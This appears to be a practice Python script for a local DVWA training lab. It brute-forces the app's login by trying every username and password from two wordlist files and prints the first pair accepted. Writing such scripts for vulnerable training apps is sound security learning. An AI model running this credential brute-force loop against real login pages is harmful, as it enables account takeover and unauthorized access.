import requests

usernames_file = '/home/kali/portswigger/authentication/bruteforce/lab1/usernames'
passwords_file = '/home/kali/portswigger/authentication/bruteforce/lab1/passwords'
with open(usernames_file) as users, open(passwords_file) as passwords:
    userList = users.readlines()
    passwordList = passwords.readlines()

for user in userList:
    for password in passwordList:
        response = requests.get(f'http://localhost/DVWA/vulnerabilities/brute/?username={user.strip()}&password={password.strip()}&Login=Login')
        if not 'incorrect' in str(response.content):
            print(f'{user.strip()} - {password.strip()} CORRECT')
            exit(0)










